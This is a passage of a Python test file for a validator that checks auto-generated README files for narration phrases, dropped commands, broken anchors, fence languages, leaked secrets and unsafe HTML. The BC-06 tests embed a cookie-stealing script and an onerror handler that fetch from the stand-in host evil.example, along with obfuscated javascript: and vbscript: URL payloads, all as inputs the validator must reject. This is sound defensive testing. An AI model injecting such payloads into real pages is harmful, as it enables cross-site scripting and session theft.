def test_generated_by_a_real_subsystem_the_facts_name_is_not_narration_either(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 102 (E20), superseded by the DECISION_LOG.md 2026-09-17 02:24 UTC
    blocklist-inversion ruling (items 102/107/108 each found a different gap in the allowlist
    design in one session). Measured on HTML-Python: "generated by the tokenizer" is a true,
    unremarkable technical claim. Under the closed self-referential blocklist, this - and any
    other real noun, whether or not this repository's own facts happen to name it - is never
    flagged: the check no longer needs to enumerate a repository's vocabulary at all."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThe document model is generated by the tokenizer.\n\n",
    )
    assert narrated != readme
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}


def test_generated_by_an_inflected_form_of_a_real_subsystem_noun_is_not_narration(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 107 (PGPY-03), closed by the same blocklist-inversion ruling. Item
    102's own exact-match noun-list widening still blocked a true sentence naming an inflected
    form of a real subsystem noun - measured on Page-Python, "generated by the clipping
    operation", fully cited, where the repository's own verified surface names "clip"/"clipper"
    but never the gerund "clipping" itself. Under the closed blocklist this needs no morphology
    handling at all: "clipping" was never a self-referential continuation to begin with."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nOutPt is generated by the clipping operation.\n\n",
    )
    assert narrated != readme
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}


def test_generated_by_a_continuation_naming_no_noun_at_all_is_not_narration(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 108 (HTMLPY-01), the case that forced the redesign: neither item 102's
    noun-list widening nor item 107's stem-match proposal could ever reach this one, because the
    continuation after "generated by" names no symbol, stem, or suffix at all. Measured on
    HTML-Python: the real docstring is a true, verified paraphrase with the bigram "generated by"
    appended by authoring's own paraphrase, exactly the TNEF/library shape, just with a full
    clause instead of a noun."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThe UIEvent class represents events that are generated by "
        "user interactions with the user interface.\n\n",
    )
    assert narrated != readme
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}


def test_generated_by_the_closed_self_referential_set_still_blocks(tmp_path: Path) -> None:
    """The other half of the DECISION_LOG.md 2026-09-17 02:24 UTC ruling's own acceptance bar: a
    genuinely self-referential sentence still blocks, both the literal tool name
    (`test_generated_by_this_library_is_a_real_technical_claim_not_narration` already covers
    "generated by repository-presenter") and the ruling's own worked example, "generated by this
    tool" - plus a mutation proving the blocklist's own word-boundary discipline: a word that
    merely starts with a blocked noun ("tooling" from "tool") is not itself blocked, the same
    no-prefix-leakage guarantee `_LOWER_WORD`'s own hyphen guard already gives the abbreviation
    check."""
    readme = _candidate().readme
    self_referential = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThis text is generated by this tool automatically.\n\n",
    )
    assert self_referential != readme
    document = validate_candidate(_candidate(self_referential), tmp_path, ())
    assert "internal narration 'generated by'" in _failed(document, "BC-07")["details"]

    # Mutation: "tooling" starts with the blocked noun "tool" but is not itself a self-referential
    # phrase - the closed set matches whole words only, never a bare prefix.
    not_a_prefix_leak = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nOutPt is generated by the tooling included here.\n\n",
    )
    assert not_a_prefix_leak != readme
    document = validate_candidate(_candidate(not_a_prefix_leak), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}


def test_a_dropped_protected_command_carries_its_destination_section_for_every_disposition_kind(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival items 23 and P18. `_check_protected`'s COMPOSING failures never carried a
    `section_id`, so `repair/targeted.py::validation_defects` recorded every one unrepairable
    ("no failing check names an LLM-owned section") even though the disposition that placed the
    unit already names a `destination_section` the repair loop may re-author. Measured 2026-09-06
    on three repositories across two ecosystems (Cells Rust, PDF Go, Cells Rust again) - and on
    both `VERIFIED_REWRITE` and `VERIFIED_PRESERVE` units, not rewrites alone, since the check
    never discriminated by disposition kind to begin with."""
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *BASE_FACTS,
            _fact("inherited_unit:006.code_block", "inherited_unit", "```\npip freeze\n```"),
        ),
    )
    for kind in ("VERIFIED_REWRITE", "VERIFIED_PRESERVE"):
        dispositions = {
            "dispositions": DISPOSITIONS["dispositions"]
            + [
                {
                    "unit_id": "inherited_unit:006.code_block",
                    "disposition": kind,
                    "destination_section": "development_testing",
                    "fact_ids": [],
                    "rationale": "r",
                }
            ]
        }
        document = validate_candidate(
            _candidate(facts=facts, dispositions=dispositions), tmp_path, ()
        )
        protected = _failed(document, "BC-08")
        assert protected["failures"][0]["section_id"] == "development_testing", kind


def test_a_hyphenated_package_name_in_prose_is_not_a_protected_command(tmp_path: Path) -> None:
    """G4-W17 arrival item 26 (lane B, Aspose.Slides for C++). `_COMMAND` ended each command
    word with `\\b`, and the boundary between `python` and `-pptx` is a word boundary - so the
    third-party package the upstream README names in a prose list (`python-pptx`, the reader its
    conformance suite opens files with, never invoked) was read as a shell command, and BC-08
    demanded the VERIFIED_REWRITE that re-authored the list keep it verbatim (measured
    2026-09-06 on inherited_unit:078.list; python-docx, go-*, git-*, cargo-*, make-* are the same
    family). A hyphen continuing the word makes a name, not a command: a real command dropped by
    the same kind of rewrite stays protected, and the dropped name is what it always should have
    been - an advisory note."""
    table = "\n".join(
        [
            "python-pptx",
            "go-task build",
            "git-lfs install",
            "cargo-make ci",
            "make-me",
            "python3 -m pip install python-pptx",
            "$ pip install python-pptx",
            "go build ./...",
            "git clone https://example.com/x",
            "cargo build",
        ]
    )
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *BASE_FACTS,
            _fact(
                "inherited_unit:078.list",
                "inherited_unit",
                "- The conformance suite opens every deck with `python-pptx` and `python-docx`.",
            ),
            _fact(
                "inherited_unit:079.paragraph",
                "inherited_unit",
                "Run `python -m pytest` before opening a pull request.",
            ),
            _fact("inherited_unit:080.code_block", "inherited_unit", f"```\n{table}\n```"),
        ),
    )
    dispositions = {
        "dispositions": DISPOSITIONS["dispositions"]
        + [
            {
                "unit_id": unit_id,
                "disposition": "VERIFIED_REWRITE",
                "destination_section": "development_testing",
                "fact_ids": [],
                "rationale": "r",
            }
            for unit_id in ("inherited_unit:078.list", "inherited_unit:079.paragraph")
        ]
    }
    candidate = _candidate(facts=facts, dispositions=dispositions)
    assert "python-pptx" not in candidate.readme and "python -m pytest" not in candidate.readme
    commands = [
        (text, unit_id)
        for category, text, unit_id in protected_fragments(candidate)
        if category == "command"
    ]
    assert commands == [
        ("pip install aspose-3d-foss", "inherited_unit:004.code_block"),
        ("python -m pytest", "inherited_unit:079.paragraph"),
        ("python3 -m pip install python-pptx", "inherited_unit:080.code_block"),
        ("$ pip install python-pptx", "inherited_unit:080.code_block"),
        ("go build ./...", "inherited_unit:080.code_block"),
        ("git clone https://example.com/x", "inherited_unit:080.code_block"),
        ("cargo build", "inherited_unit:080.code_block"),
    ]
    document = validate_candidate(candidate, tmp_path, ())
    assert _failed(document, "BC-08")["details"] == [
        "inherited_unit:079.paragraph: VERIFIED_REWRITE keeps the command 'python -m pytest' "
        "but the candidate does not render it"
    ]
    assert (
        "inherited_unit:078.list: the rewrite no longer names python-docx, python-pptx"
        in document["advisory"]
    )


def test_an_anchor_to_a_heading_the_candidate_dropped_names_the_section_it_renders_in(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 47 (lane D PROPOSAL P20, Aspose.PDF for Go). `_check_links` built its
    anchor failure with no section, so `repair/targeted.py::validation_defects` recorded it
    unrepairable ("no failing check names an LLM-owned section") - the shape item 23 fixed for
    BC-08, one check over. Measured 2026-09-08: a VERIFIED_PRESERVE unit copied verbatim carried
    "[Encryption and Signing](#encryption-and-signing)" into a candidate whose plan renders no
    such heading. The failure now names the shell section the link renders in, read off its own
    line - whichever section that is; the router decides what is revisable - and an anchor that
    resolves is no failure at all."""
    readme = _candidate().readme
    sentence = "Encryption is covered in [Encryption and Signing](#encryption-and-signing) below."
    for heading, section in (
        ("## Scope and Limitations", "scope_limitations"),
        ("## API Reference", "api_reference"),
    ):
        placed = readme.replace(f"{heading}\n\n", f"{heading}\n\n{sentence}\n\n")
        assert placed != readme
        links = _failed(validate_candidate(_candidate(placed), tmp_path, ()), "BC-06")
        assert links["causal_stage"] == "COMPOSING"
        assert links["failures"] == [
            {
                "section_id": section,
                "causal_stage": "COMPOSING",
                "detail": "#encryption-and-signing: no heading #encryption-and-signing",
            }
        ], section
    resolving = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nInstall first, then see [Quick Start](#quick-start).\n\n",
    )
    assert resolving != readme
    assert _verdicts(validate_candidate(_candidate(resolving), tmp_path, ()))["BC-06"] == "PASS"


def test_unsafe_raw_html_surviving_from_an_adversarial_readme_fails_bc06(tmp_path: Path) -> None:
    """G7-W01 (docs/THREAT_MODEL.md area 3). A cloned repository's own README is untrusted
    content: `evidence/facts/inherited.py` captures a raw HTML block unit byte for byte like any
    other inherited unit, and a reconciliation disposition may legitimately preserve one verbatim
    (a real badge/logo block, say). Before this check, nothing ever looked at a preserved block's
    own markup for a hazard - `extract_links` only ever walked an `<a>`/`<img>` tag's href/src.
    A standalone `<script>` tag, an `onerror=` handler on an otherwise ordinary tag, and a
    `javascript:` scheme each must fail BC-06 wherever they survive into the rendered candidate,
    and the identical construct quoted inside a fenced code block (inert on GitHub) must not."""
    readme = _candidate().readme
    scripted = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\n"
        "<script>fetch('https://evil.example/steal?t='+document.cookie)</script>\n\n",
    )
    assert scripted != readme
    failed = _failed(validate_candidate(_candidate(scripted), tmp_path, ()), "BC-06")
    assert any("unsafe raw HTML" in detail and "<script" in detail for detail in failed["details"])

    handler = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\n"
        '<img src="x.png" onerror="fetch(\'https://evil.example/steal\')">\n\n',
    )
    failed = _failed(validate_candidate(_candidate(handler), tmp_path, ()), "BC-06")
    assert any("onerror=" in detail for detail in failed["details"])

    scheme = readme.replace(
        "## Scope and Limitations\n\n",
        '## Scope and Limitations\n\n<a href="javascript:alert(1)">click</a>\n\n',
    )
    failed = _failed(validate_candidate(_candidate(scheme), tmp_path, ()), "BC-06")
    assert any("javascript:" in detail for detail in failed["details"])

    # The same literal text, fenced as a code example, renders as inert text on GitHub - not
    # this hazard - and must not fail the check.
    fenced = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\n```html\n<script>alert(1)</script>\n```\n\n",
    )
    assert _verdicts(validate_candidate(_candidate(fenced), tmp_path, ()))["BC-06"] == "PASS"


def test_a_scheme_name_in_prose_is_not_a_url_and_fails_no_check(tmp_path: Path) -> None:
    """BC-06 false positive (aspose-pdf-foss/Aspose.PDF-FOSS-for-TypeScript). The scheme rule
    matched `javascript:`/`vbscript:` anywhere outside a fence, so the API-reference prose label
    "Document-level JavaScript: every entry ..." (a docstring of `GetJavaScripts`) failed the
    whole candidate. A colon after a word is not a URL: the scheme is a hazard only where a URL is
    read - a link or image destination, a reference definition, an autolink, or a URL-bearing
    attribute value - and every one of these prose spellings must pass."""
    readme = _candidate().readme
    prose = (
        "GetJavaScripts: Document-level JavaScript: every entry of the /Names /JavaScript tree, "
        "sorted by name.\n\n"
        "VBScript: legacy macro support is out of scope.\n\n"
        "A `javascript:` scheme in a link is refused, see [Scope](#scope-and-limitations).\n\n"
        '<p title="JavaScript: intro" data-label="VBScript: example">A label.</p>\n\n'
    )
    labelled = readme.replace(
        "## Scope and Limitations\n\n", "## Scope and Limitations\n\n" + prose
    )
    assert labelled != readme
    assert _verdicts(validate_candidate(_candidate(labelled), tmp_path, ()))["BC-06"] == "PASS"


def test_a_dangerous_scheme_at_every_url_position_still_fails_bc06(tmp_path: Path) -> None:
    """Negative controls for the URL-position rule: each real hazard, at each place a URL is
    read, still fails BC-06 naming the offending span. The span is named by its `script:` tail,
    which every spelling below carries (including the entity- and tab-obfuscated ones, whose raw
    text the detail quotes as written)."""
    readme = _candidate().readme
    hazards = (
        "[x](javascript:alert(1))",  # markdown link destination
        "[x]( javascript:alert(1) )",  # destination after whitespace
        "[x](<javascript:alert(1)>)",  # angle-bracket destination
        "![x](vbscript:msgbox(1))",  # markdown image destination
        "[x][ref]\n\n[ref]: javascript:alert(1)",  # reference-style definition
        "<javascript:alert(1)>",  # autolink
        '<a href="javascript:alert(1)">click</a>',  # double-quoted href
        "<a href='javascript:alert(1)'>click</a>",  # single-quoted href
        "<a href=javascript:alert(1)>click</a>",  # unquoted href
        '<img src="vbscript:msgbox(1)">',  # src
        '<a href="&#106;avascript:alert(1)">click</a>',  # entity-encoded scheme
        '<a href="java\tscript:alert(1)">click</a>',  # tab inside the scheme
        '<a xlink:href="javascript:alert(1)">click</a>',  # namespaced href
        '<form action="javascript:alert(1)"></form>',  # form action
        '<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>',  # SVG values
    )
    for hazard in hazards:
        injected = readme.replace(
            "## Scope and Limitations\n\n", f"## Scope and Limitations\n\n{hazard}\n\n"
        )
        assert injected != readme, hazard
        failed = _failed(validate_candidate(_candidate(injected), tmp_path, ()), "BC-06")
        assert any("script:" in detail for detail in failed["details"]), hazard


def test_renderer_owned_reads_a_registrys_click_through_target_off_ecosystemspec() -> None:
    """G4-W17 arrival item 89 (words-net worker LANE-F-03, Words-.NET). `_renderer_owned`
    special-cased pypi.org's own registry-page path and github.com's own repository path, but had
    no case for nuget.org - so a .NET version badge's own href, built from
    `core/ecosystems.py`'s `version_badge` template, could never be verified for a repository
    whose README doesn't already carry that exact URL as a scraped `link_target` fact. Measured on
    Words-.NET (never carried the badge) and cross-checked against three other sealed NuGet-based
    .NET candidates, each of which had only ever passed by coincidence, not by guarantee. Fix:
    read the registry's click-through target generically off `EcosystemSpec.badge` - the same
    template `_badges` (composition/renderer.py) renders - rather than one more per-host
    carve-out, closing the identical latent gap for Go/Rust/TypeScript at the same time."""
    net_entry = ENTRY.model_copy(update={"ecosystem": "net"})
    net_facts = FactsDocument(
        ENTRY.repository, REVISION, (_fact("package:name", "package", "Aspose.Words.FOSS"),)
    )
    candidate = dataclasses.replace(_candidate(), entry=net_entry, facts=net_facts)
    assert _renderer_owned(candidate, "https://www.nuget.org/packages/Aspose.Words.FOSS/")
    # Mutation: a NuGet URL for a DIFFERENT package is not this repository's own badge target -
    # never every nuget.org link is exempted, only this repository's own registry page.
    assert not _renderer_owned(candidate, "https://www.nuget.org/packages/SomeOtherPackage/")


def test_narration_is_matched_at_a_word_boundary_not_as_a_bare_substring(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 22. `_NARRATION`'s bare substring check read a repository's own
    public type, `WorkbookValidator`, as the narration phrase "validator" - "validator" is one
    continuous word inside "workbookvalidator", never a word-boundary match on its own. Measured
    2026-09-06, corroborated independently on Cells Rust and Cells Java; no composition for
    either could pass without lying about its own surface. A genuine standalone mention of the
    word must still be caught."""
    readme = _candidate().readme
    embedded = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThe library exposes WorkbookValidator for checks.\n\n",
    )
    assert embedded != readme
    document = validate_candidate(_candidate(embedded), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}

    standalone = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThis uses a validator internally.\n\n",
    )
    document = validate_candidate(_candidate(standalone), tmp_path, ())
    assert "internal narration 'validator'" in _failed(document, "BC-07")["details"]


def test_narration_exempts_a_phrase_that_is_the_repositorys_own_public_symbol(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 22's own public_symbol exemption: a class the product actually calls
    `Validator` (bare, not embedded in a longer name) is its own API, not the pipeline's
    vocabulary leaking through."""
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (*BASE_FACTS, _fact("public_symbol:widget.validator", "public_symbol", "widget.Validator")),
    )
    readme = _candidate(facts=facts).readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThe library exposes a Validator for checks.\n\n",
    )
    assert narrated != readme
    document = validate_candidate(_candidate(narrated, facts=facts), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}


def test_narration_exempts_a_phrase_the_upstream_readme_itself_already_used(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 22, lane D PROPOSAL P14. Aspose.PDF for Go's own README says "confirm
    full conformance with a dedicated validator such as veraPDF" - "validator" is a standalone
    word (a word boundary changes nothing), not a public_symbol (0 of 1,467 contain it), and not
    in a code span, so none of item 22's three remedies cleared it. A candidate faithfully
    restating the upstream README's own words is not this tool narrating about itself; a genuine
    mention with no such inherited backing must still be caught."""
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *BASE_FACTS,
            _fact(
                "inherited_unit:005.list",
                "inherited_unit",
                "Confirm full conformance with a dedicated validator such as veraPDF.",
            ),
        ),
    )
    readme = _candidate(facts=facts).readme
    restated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nUse a dedicated validator to confirm conformance.\n\n",
    )
    assert restated != readme
    document = validate_candidate(_candidate(restated, facts=facts), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}

    # Mutation: without the matching inherited_unit fact, the identical prose still fails.
    document = validate_candidate(_candidate(restated), tmp_path, ())
    assert "internal narration 'validator'" in _failed(document, "BC-07")["details"]


def test_narration_exempts_a_phrase_inside_a_public_symbols_own_docstring(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 22, lane C PROPOSAL N. Measured 2026-09-06 on Aspose.Cells for Java: a
    public_symbol's own `docstring` attribute renders verbatim into the collapsed API Reference
    (renderer.py's `_symbol_description`), and BC-07 failed on `validator` even though
    `content_units.json` held no occurrence of it at all - targeted_repair had nothing to revise
    and re-raised byte-identically. Anchored to the fact, not the section: narration invented
    anywhere, the API Reference table included, still blocks."""
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *BASE_FACTS,
            Fact(
                "public_symbol:widget.checker",
                "public_symbol",
                "widget.Checker",
                (Evidence("README.md"),),
                attributes={"docstring": "A formula validator for worksheet cells."},
            ),
        ),
    )
    readme = _candidate(facts=facts).readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThis uses a validator internally.\n\n",
    )
    assert narrated != readme
    document = validate_candidate(_candidate(narrated, facts=facts), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}

    # Mutation: invented narration is still caught, even inside the same section the docstring
    # exemption reaches - the exemption is anchored to the fact, never to a region.
    invented = readme.replace(
        "## API Reference\n\n",
        "## API Reference\n\nThis readme was generated by an automated process.\n\n",
    )
    assert invented != readme
    document = validate_candidate(_candidate(invented, facts=facts), tmp_path, ())
    assert "internal narration 'this readme was'" in _failed(document, "BC-07")["details"]


def test_every_failure_names_its_causal_stage(tmp_path: Path) -> None:
    readme = _candidate().readme

    second_h1 = validate_candidate(_candidate(readme + "\n# Second\n"), tmp_path, ())
    structure = _failed(second_h1, "BC-07")
    assert structure["causal_stage"] == "COMPOSING"
    assert structure["details"] == [
        "expected exactly one H1 '# Aspose.3D FOSS for Python'; found 2"
    ]

    one_column = validate_candidate(
        _candidate(readme.replace('subgraph capr[" "]', 'subgraph capx[" "]')), tmp_path, ()
    )
    assert _failed(one_column, "BC-07")["details"] == [
        "At a Glance: 6 capabilities form two balanced columns; found 1 column(s)"
    ]

    lowercase = validate_candidate(
        _candidate(readme + "\nIt writes pdf and glb files, and reads .dae files.\n"), tmp_path, ()
    )
    assert _failed(lowercase, "BC-07")["details"] == [
        "abbreviation 'glb' is not in its canonical form GLB",
        "abbreviation 'pdf' is not in its canonical form PDF",
    ]

    edition = validate_candidate(
        _candidate(readme + "\nSee the Community Edition.\n"), tmp_path, ()
    )
    links = _failed(edition, "BC-06")
    assert links["causal_stage"] == "COMPOSING"
    assert links["details"] == ["non-canonical edition name 'Community Edition'"]

    # plans/idea.md L51-53: the lowercase substitute the authoring code once generated fails too.
    lowercase_edition = validate_candidate(
        _candidate(readme + "\nThe commercial edition adds FBX export.\n"), tmp_path, ()
    )
    links = _failed(lowercase_edition, "BC-06")
    assert links["causal_stage"] == "COMPOSING"
    assert links["details"] == ["non-canonical edition name 'commercial edition'"]

    stray = validate_candidate(_candidate(readme.replace("`Scene`", "`Unknown`")), tmp_path, ())
    assert _failed(stray, "BC-04")["details"] == ["code span 'Unknown' is not a fact value"]

    no_install = validate_candidate(
        _candidate(readme.replace("```bash\npip install aspose-3d-foss\n```", "See the docs.")),
        tmp_path,
        (),
    )
    assert _failed(no_install, "BC-02")["details"] == [
        "the Installation section does not render 'pip install aspose-3d-foss'"
    ]

    dropped = {"dispositions": DISPOSITIONS["dispositions"][:1] + DISPOSITIONS["dispositions"][2:]}
    missing = validate_candidate(_candidate(dispositions=dropped), tmp_path, ())
    reconciling = _failed(missing, "BC-05")
    assert reconciling["causal_stage"] == "RECONCILING"
    assert reconciling["details"] == [
        "inherited_unit:002.paragraph has 0 dispositions; exactly one is required"
    ]

    omitted_plan = {**PLAN, "additional_example_ids": ["example:999"]}
    unknown_example = validate_candidate(_candidate(plan=omitted_plan), tmp_path, ())
    assert _failed(unknown_example, "BC-03")["causal_stage"] == "PLANNING"

    unverified = FactsDocument(
        ENTRY.repository,
        REVISION,
        tuple(
            _fact(
                "example:001",
                "example",
                EXAMPLE,
                "lines 5-8; python fence; unit inherited_unit:003.code_block",
                "example 1: NEEDS_INPUT; opens an input",
                polarity="UNRESOLVED",
            )
            if fact.id == "example:001"
            else fact
            for fact in BASE_FACTS
        ),
    )
    not_executed = validate_candidate(_candidate(facts=unverified), tmp_path, ())
    examples = _failed(not_executed, "BC-03")
    assert examples["causal_stage"] == "EXTRACTING"
    assert examples["details"] == [
        "example:001 was not executed or compiled at this revision (UNRESOLVED)"
    ]

    kept_command = FactsDocument(
        ENTRY.repository,
        REVISION,
        (
            *BASE_FACTS,
            _fact("inherited_unit:005.code_block", "inherited_unit", "```bash\ngit clone x\n```"),
        ),
    )
    kept = {
        "dispositions": DISPOSITIONS["dispositions"]
        + [
            {
                "unit_id": "inherited_unit:005.code_block",
                "disposition": "VERIFIED_PRESERVE",
                "destination_section": "development_testing",
                "fact_ids": [],
                "rationale": "r",
            }
        ]
    }
    lost = validate_candidate(_candidate(facts=kept_command, dispositions=kept), tmp_path, ())
    protected = _failed(lost, "BC-08")
    assert protected["causal_stage"] == "COMPOSING"
    assert protected["details"] == [
        "inherited_unit:005.code_block: VERIFIED_PRESERVE keeps the command 'git clone x' but "
        "the candidate does not render it"
    ]
    # G4-W17 arrival items 23/P18: the disposition's own destination_section reaches the
    # Failure, so repair can route to the LLM-owned section that may re-author it.
    assert protected["failures"][0]["section_id"] == "development_testing"

    (tmp_path / "calls.jsonl").write_text('{"key": "sk-live-secret-value"}\n', encoding="utf-8")
    secret = ConfiguredSecret("GPT_OSS_API_KEY", b"sk-live-secret-value")
    leaked = validate_candidate(_candidate(), tmp_path, (secret,))
    bundle = _failed(leaked, "BC-09")
    assert bundle["causal_stage"] is None
    assert bundle["details"] == ["value of GPT_OSS_API_KEY found in calls.jsonl"]


def test_fences_reads_commonmark_not_a_hand_rolled_backtick_scan() -> None:
    """TB-05, D5: the old line-scan only recognized a ```-fence; a tilde fence or a multi-word
    info string parsed however the substring happened to fall. The project's own CommonMark
    parser (`markdown_it`, already used by `evidence/facts/links.py`) reads both the same way a
    real renderer does."""
    assert _fences("```python\nprint(1)\n```\n") == [("python", "print(1)\n")]
    assert _fences("~~~csharp\nConsole.WriteLine(1);\n~~~\n") == [
        ("csharp", "Console.WriteLine(1);\n")
    ]
    # CommonMark's info string is free text; only its first word names the language.
    assert _fences("```py noqa: mixed-indent\nx = 1\n```\n") == [("py", "x = 1\n")]
    assert _fences("```\nno language\n```\n") == [("", "no language\n")]


def test_bc03_checks_the_ecosystems_own_declared_fence_aliases(tmp_path: Path) -> None:
    """TB-05, D5: `_check_examples` compared a fence's bare language against
    `candidate.entry.ecosystem` itself (`"python"`, `"net"`), not against
    `EcosystemSpec.example_fences`. A .NET example is fenced ```csharp, never ```net - so no
    unplanned .NET code block could ever be caught this way, and a Python example fenced ```py or
    ```python3 (both declared aliases) escaped the check the same way. Measured against the real
    fence aliases the ecosystems actually declare, not a synthetic language."""
    readme = _candidate().readme

    # Control 1 - an admitted alias for the *verified* example must still match it, not be
    # flagged as a stray block: the base README's own fence is literally ```python already, so
    # swap it for the "py" alias and confirm BC-03 still passes.
    aliased_verified = readme.replace("```python\n" + EXAMPLE, "```py\n" + EXAMPLE)
    assert aliased_verified != readme
    passing = validate_candidate(_candidate(aliased_verified), tmp_path, ())
    assert "BC-03" not in {f["id"] for f in blocking_failures(passing)}

    # Control 2 - an unplanned block under an admitted alias (not the bare fence language) must
    # now fail, where before it silently escaped the ecosystem comparison entirely.
    stray_alias = readme + "\n```py\nprint('not a planned example')\n```\n"
    failing = validate_candidate(_candidate(stray_alias), tmp_path, ())
    stray = _failed(failing, "BC-03")
    assert stray["causal_stage"] == "COMPOSING"
    assert "not a planned verified example" in stray["details"][0]

    # Control 3 - edited verified code must still fail exactly as before: the fix only widens
    # which fence languages are considered, never which bodies count as verified.
    edited = readme.replace(EXAMPLE, EXAMPLE.replace("a.glb", "b.glb"))
    assert edited != readme
    still_failing = validate_candidate(_candidate(edited), tmp_path, ())
    assert "BC-03" in {f["id"] for f in blocking_failures(still_failing)}

    # Control 4 - a fence in an unrelated, non-example language (bash, already present for
    # Installation) must never false-positive.
    assert "```bash" in readme
    assert "BC-03" not in {
        f["id"] for f in blocking_failures(validate_candidate(_candidate(), tmp_path, ()))
    }

    # Control 5 - a tilde-fenced unplanned block in the ecosystem's own language must now be
    # caught too: the old line-scan recognized only backtick fences.
    tilde_stray = readme + "\n~~~python\nprint('not a planned example')\n~~~\n"
    tilde_failing = validate_candidate(_candidate(tilde_stray), tmp_path, ())
    assert "BC-03" in {f["id"] for f in blocking_failures(tilde_failing)}

    # Control 6 - the sound base candidate is the no-regression case: unchanged, BC-03 still
    # passes (also covered by test_a_sound_candidate_passes_nine_checks_and_pends_the_two_judged_
    # later, restated here beside its own controls).
    assert "BC-03" not in {
        f["id"] for f in blocking_failures(validate_candidate(_candidate(), tmp_path, ()))
    }


def test_bc03_reaches_net_only_through_its_own_declared_aliases(tmp_path: Path) -> None:
    """TB-05, D5's own confirming case: a .NET candidate's examples are fenced ```csharp - the
    bare ecosystem string is "net", so `language == candidate.entry.ecosystem` never matched a
    single real .NET fence and an unplanned ```csharp block passed BC-03 silently. Exercised
    directly against `_check_examples` (helper level) since building a full .NET candidate through
    `render_readme` is out of this taskcard's scope."""
    net_entry = ENTRY.model_copy(update={"ecosystem": "net", "platform": "net"})
    net_example = 'using Aspose.ThreeD;\nvar scene = new Scene();\nscene.Save("a.glb");\n'
    facts = FactsDocument(
        ENTRY.repository,
        REVISION,
        tuple(
            _fact(
                "example:001",
                "example",
                net_example,
                "lines 1-3; csharp fence; unit inherited_unit:003.code_block",
                "example 1: EXECUTED; exit 0",
            )
            if fact.id == "example:001"
            else fact
            for fact in BASE_FACTS
        ),
    )
    plan = {**PLAN, "quick_start_example_id": "example:001"}
    base = _candidate(facts=facts, plan=plan)
    net_candidate = dataclasses.replace(base, entry=net_entry)

    # An unplanned ```csharp block (the ecosystem's real, declared fence) must now be caught.
    stray_readme = f'```csharp\n{net_example}```\n\n```csharp\nConsole.WriteLine("stray");\n```\n'
    stray = dataclasses.replace(net_candidate, readme=stray_readme)
    failures = _check_examples(stray)
    assert any("csharp" in failure.detail and "stray" in failure.detail for failure in failures)

    # The verified example itself, fenced under a *different* admitted alias ("cs"), must still
    # be recognized and not flagged.
    aliased_readme = f"```cs\n{net_example}```\n"
    aliased = dataclasses.replace(net_candidate, readme=aliased_readme)
    assert _check_examples(aliased) == []

    # A fence in the bare ecosystem name itself ("net") - not one of .NET's real declared
    # aliases - is not an example fence at all and must never false-positive.
    bare_readme = f"```net\nirrelevant\n```\n\n```csharp\n{net_example}```\n"
    bare = dataclasses.replace(net_candidate, readme=bare_readme)
    assert _check_examples(bare) == []


def test_validation_json_is_deterministic_and_sorted(tmp_path: Path) -> None:
    document = validate_candidate(_candidate(), tmp_path, ())
    first = write_validation(document, tmp_path / "validation.json")
    second = write_validation(document, tmp_path / "validation.json")
    data = (tmp_path / "validation.json").read_bytes()
    assert first == second == hashlib.sha256(data).hexdigest()
    assert data.endswith(b"}\n") and b"\r" not in data
    assert list(json.loads(data)) == sorted(json.loads(data))


def test_example_headings_are_real_unique_task_names(tmp_path: Path) -> None:
    section = (
        "## Additional Examples\n\nLead-in.\n\n<details>\n"
        "<summary>View Additional Examples</summary>\n\n"
        "### Example 2\n\n```python\nprint(1)\n```\n\n### Example 2\n\n```python\nprint(1)\n```\n\n"
        "### Save a Scene\n\n```python\nprint(1)\n```\n\n</details>\n"
    )
    document = validate_candidate(_candidate(_candidate().readme + "\n" + section), tmp_path, ())
    details = _failed(document, "BC-07")["details"]
    assert "example heading 'Example 2' is reused" in details
    assert "example heading 'Example 2' names no task" in details
    assert not any("Save a Scene" in detail for detail in details)


# ---------------------------------------------------------------------------------------------
# Verification V2 items 8 and 9 (BC-07 v8): heading case and abbreviations, fence languages and
